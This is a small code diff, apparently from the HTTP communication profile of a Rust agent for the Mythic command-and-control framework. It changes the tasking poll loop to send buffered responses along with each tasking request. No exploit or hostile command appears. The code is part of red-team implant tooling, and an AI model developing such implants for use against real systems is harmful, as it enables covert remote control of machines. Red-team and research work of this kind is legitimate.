@@ -420,8 +420,8 @@ impl Profile for HttpProfile {
                 break;
             }
 
-            // Build get_tasking message
-            let msg = crate::structs::MythicMessage::new_get_tasking();
+            // Build get_tasking message, including any buffered responses
+            let msg = crate::responses::drain_poll_buffer();
             let msg_json = match serde_json::to_vec(&msg) {
                 Ok(j) => j,
                 Err(_) => continue,
